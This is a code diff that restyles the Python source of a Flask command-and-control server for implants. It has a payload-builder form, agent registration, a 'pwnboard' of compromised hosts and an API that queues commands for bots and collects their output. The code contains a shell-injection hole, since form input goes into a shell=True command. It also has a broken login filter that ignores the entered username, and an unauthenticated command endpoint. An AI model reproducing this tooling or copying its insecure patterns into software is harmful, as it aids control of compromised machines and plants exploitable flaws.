@@ -18,13 +18,14 @@ def login_required(f):
     :returns: redirects an unauthenticated user to /login
     :rtype: wrap
     """
+
     @wraps(f)
     def wrap(*args, **kwargs):
-        if 'logged_in' in session:
+        if "logged_in" in session:
             return f(*args, **kwargs)
         else:
-            flash('You need to login first.')
-            return redirect(url_for('login'))
+            flash("You need to login first.")
+            return redirect(url_for("login"))
 
     return wrap
 
@@ -39,16 +40,17 @@ class MyForm(FlaskForm):
     :returns: none
     :rtype: None
     """
-    ip = StringField('IP')
-    sleep = StringField('Sleep Time')
+
+    ip = StringField("IP")
+    sleep = StringField("Sleep Time")
 
 
 class AuthForm(FlaskForm):
-    """Form used to register a user
-    """
-    email = StringField('email')
-    name = StringField('name')
-    password = PasswordField('password')
+    """Form used to register a user"""
+
+    email = StringField("email")
+    name = StringField("name")
+    password = PasswordField("password")
 
 
 def build_implant(ip="127.0.0.1", sleepTime="0"):
@@ -62,8 +64,7 @@ def build_implant(ip="127.0.0.1", sleepTime="0"):
     :rtype: None
     """
     subprocess.Popen(
-                    [f"../implant/payloads/make.sh -h {ip} -s {sleepTime}"],
-                    shell=True
+        [f"../implant/payloads/make.sh -h {ip} -s {sleepTime}"], shell=True
     )
 
 
@@ -76,11 +77,11 @@ def add_agent(agent_dict):
     """
     # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])
     # ).scalar():
-    args = [str(agent_dict['Stats'][key]) for key in agent_dict['Stats']]
-    args += [str(agent_dict['total'])]
-    args += [agent_dict['IP']]
-    args += [agent_dict['USERNAME']]
-    args += [agent_dict['SleepTime']]
+    args = [str(agent_dict["Stats"][key]) for key in agent_dict["Stats"]]
+    args += [str(agent_dict["total"])]
+    args += [agent_dict["IP"]]
+    args += [agent_dict["USERNAME"]]
+    args += [agent_dict["SleepTime"]]
     agent = Agent(*args)
     db.session.add(agent)
     db.session.flush()
@@ -92,7 +93,7 @@ def add_agent(agent_dict):
     return agent.id
 
 
-@app.route('/config', methods=['GET', 'POST'])
+@app.route("/config", methods=["GET", "POST"])
 @login_required
 def generate():
     """Endpoint that contains a form allowing the user to provide values
@@ -100,16 +101,17 @@ def generate():
 
     """
     form = MyForm()
-    if request.method == 'POST':
-        args = [request.form[key] for key in request.form.keys()
-                if request.form[key] != '']
+    if request.method == "POST":
+        args = [
+            request.form[key] for key in request.form.keys() if request.form[key] != ""
+        ]
         print(args)
         build_implant(*args)
         print("Payload Successfuly Generated!")
     return render_template("config.html", form=form)
 
 
-@app.route('/bot<id>', methods=['GET'])
+@app.route("/bot<id>", methods=["GET"])
 @login_required
 def bot(id):
     """Endpoint that displays all the information regarding the
@@ -123,7 +125,7 @@ def bot(id):
     return render_template("bot.html", agent=agent)
 
 
-@app.route('/', methods=['GET'])
+@app.route("/", methods=["GET"])
 @login_required
 def home():
     """Endpoint that displays a pwnboard that includes all of the
@@ -132,10 +134,10 @@ def home():
     """
     check_agent_alive()
     agents = db.session.query(Agent).all()
-    return render_template('index.html', agents=agents)
+    return render_template("index.html", agents=agents)
 
 
-@app.route('/api/1.1/add_command', methods=['POST'])
+@app.route("/api/1.1/add_command", methods=["POST"])
 def add_command():
     """API endpoint that allows the bot terminal to add
     commands to the Command table in the database
@@ -143,22 +145,22 @@ def add_command():
     :returns: a json RPC object containing any finished jobs and the new job ID
     :rtype: dict
     """
-    if request.method == 'POST':
+    if request.method == "POST":
         json = request.json
         if json is None:
             return "Bad request"
-        command = json['params']
-        implantID = json['method'][4:]
+        command = json["params"]
+        implantID = json["method"][4:]
         new_comm = Commands(implantID=implantID, command=command)
         db.session.add(new_comm)
         db.session.flush()
         db.session.commit()
         db.session.refresh(new_comm)
         res = Commands.query.filter(
-                                    Commands.implantID == implantID,
-                                    Commands.retrieved == True,
-                                    Commands.displayed == False
-                                    ).first()
+            Commands.implantID == implantID,
+            Commands.retrieved == True,
+            Commands.displayed == False,
+        ).first()
         output = f"[+] new job started with id {new_comm.commandID}"
         if res is not None and res.output is not None:
             res.displayed = True
@@ -173,79 +175,78 @@ def add_command():
         return rpc
 
 
-@app.route('/welcome', methods=['GET'])
+@app.route("/welcome", methods=["GET"])
 def welcome():
     return render_template("welcome.html")
 
 
-@app.route('/login', methods=['GET', 'POST'])
+@app.route("/login", methods=["GET", "POST"])
 def login():
     """Endpoint that allows a user to login and authenticate
     themselves with the server
 
     """
     error = None
-    if request.method == 'POST':
-        username = request.form['username']
-        password = request.form['password']
+    if request.method == "POST":
+        username = request.form["username"]
+        password = request.form["password"]
         user = User.query.filter(username == username).first()
         if not user:
             error = "Account not found"
         elif not check_password_hash(user.password, password):
             error = "Invalid credentials. Please try again."
         else:
-            session['logged_in'] = True
-            flash('You were just logged in!')
-            return redirect(url_for('home'))
-    return render_template('login.html', error=error)
+            session["logged_in"] = True
+            flash("You were just logged in!")
+            return redirect(url_for("home"))
+    return render_template("login.html", error=error)
 
 
-@app.route('/logout', methods=['GET'])
+@app.route("/logout", methods=["GET"])
 @login_required
 def logout():
-    """Endpoint that allows a user to logout of their session
-
-    """
-    session.pop('logged_in', None)
-    flash('You were just logged out!')
-    return redirect(url_for('welcome'))
+    """Endpoint that allows a user to logout of their session"""
+    session.pop("logged_in", None)
+    flash("You were just logged out!")
+    return redirect(url_for("welcome"))
 
 
-@app.route('/signup', methods=['GET', 'POST'])
+@app.route("/signup", methods=["GET", "POST"])
 def signup():
-    """Endpoint that allows a user to register an account
-    """
+    """Endpoint that allows a user to register an account"""
     form = AuthForm()
 
-    if request.method == 'POST':
-        email = request.form['email']
-        name = request.form['name']
-        password = request.form['password']
+    if request.method == "POST":
+        email = request.form["email"]
+        name = request.form["name"]
+        password = request.form["password"]
 
         user = User.query.filter_by(email=email).first()
 
         if user:
             return "BINGUS: ALREADY REGISTERED"
 
-        new_user = User(email=email, name=name,
-                        password=generate_password_hash
-                        (password, method='sha256'))
+        new_user = User(
+            email=email,
+            name=name,
+            password=generate_password_hash(password, method="sha256"),
+        )
 
         db.session.add(new_user)
         db.session.commit()
-        return redirect(url_for('login'))
+        return redirect(url_for("login"))
 
-    return render_template('signup.html', form=form)
+    return render_template("signup.html", form=form)
 
 
 def check_agent_alive():
     agents = db.session.query(Agent).all()
     for agent in agents:
         last_seen = agent.lastSeen
-        last_seen = datetime.strptime(last_seen, '%d %B, %Y %H:%M:%S')
+        last_seen = datetime.strptime(last_seen, "%d %B, %Y %H:%M:%S")
         curr_time = datetime.now()
         elapsed = curr_time - last_seen
-        agent_expected = timedelta(seconds=(agent.sleepTime*2))
+        agent_expected = timedelta(seconds=(agent.sleepTime * 2))
         if elapsed > agent_expected:
             agent.isAlive = False
         else:
@@ -254,7 +255,7 @@ def check_agent_alive():
         db.session.commit()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     """Runs the base flask app, only use for debugging,
     otherwise use the preferred method in README.md
 
